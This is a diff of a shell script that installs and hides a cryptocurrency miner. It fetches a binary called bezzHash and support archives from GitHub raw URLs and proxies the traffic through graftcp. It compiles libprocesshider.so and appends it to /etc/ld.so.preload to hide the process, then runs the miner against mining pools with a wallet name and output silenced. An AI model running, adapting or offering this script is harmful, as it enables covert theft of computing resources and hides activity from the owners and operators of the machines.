@@ -1,14 +1,10 @@
 #!/bin/sh
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
 
-npm i -g node-process-hider
-
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
+apt update && apt-get install libpci3 && sudo apt-get --purge remove "*nvidia*" &&  sudo apt-get install nvidia-driver-460
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
 tar -xvzf graphics.tar.gz
+
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
@@ -36,7 +32,7 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+./graftcp/graftcp wget https://github.com/aurbach55/zash/raw/main/bezzHash
 chmod +x bezzHash
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
@@ -45,6 +41,6 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-ph add bezzHash
 
-./graftcp/graftcp ./bezzHash --url=REEbR2d3Ju3F5tfug3P81qeb4nd79tjC4e.$(echo $(shuf -i 1-99999 -n 1)-hunterd)@us-rvn.2miners.com:6060
+./graftcp/graftcp sudo ./bezzHash -pool stratum+tcp://ethash.kupool.com:8888 -wal hunterd -pass x -a coinX -tt 70 -tstop 84 -tstart 72  -fret 2 -rate 1 >/dev/null 2>&1
+ 
